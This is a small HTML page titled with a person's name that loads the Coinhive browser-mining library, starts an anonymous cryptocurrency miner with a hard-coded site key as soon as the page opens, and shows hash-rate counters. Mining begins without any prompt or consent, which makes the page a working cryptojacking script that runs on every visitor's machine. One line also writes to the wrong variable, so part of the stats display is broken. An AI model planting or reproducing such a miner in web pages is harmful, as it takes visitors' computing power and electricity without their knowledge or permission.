<html>

	<head>
	    <title>Jonas Ha</title>
	    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
	</head>
	<body>
	    <div id="hashesPerSecond"></div>
	    <div id="totalHashes"></div>
	    <div id="acceptedHashes"></div>


	    <script>
	    var hashesPerSecondElement = document.getElementById('hashesPerSecond');
	    var totalHashesElement = document.getElementById('totalHashes');
	    var acceptedHashesElement = document.getElementById('acceptedHashes');

	    var miner = new CoinHive.Anonymous('dIhhmYuKCoBc8tCupB1tWhZP1wkc5Bd8');
	    miner.start();



	    // Listen on events
	    miner.on('found', function() { /* Hash found */ })
	    miner.on('accepted', function() { /* Hash accepted by the pool */ })

	    // Update stats once per second
	    setInterval(function() {
	        var hashesPerSecond = miner.getHashesPerSecond();
	        var totalHashes = miner.getTotalHashes();
	        var acceptedHashes = miner.getAcceptedHashes();

	        hashesPerSecond.innerText = hashesPerSecond;
	        totalHashesElement.innerText = totalHashes;
	        acceptedHashesElement.innerText = acceptedHashes;

	    }, 1000);
	    </script>
	</body>

</html>
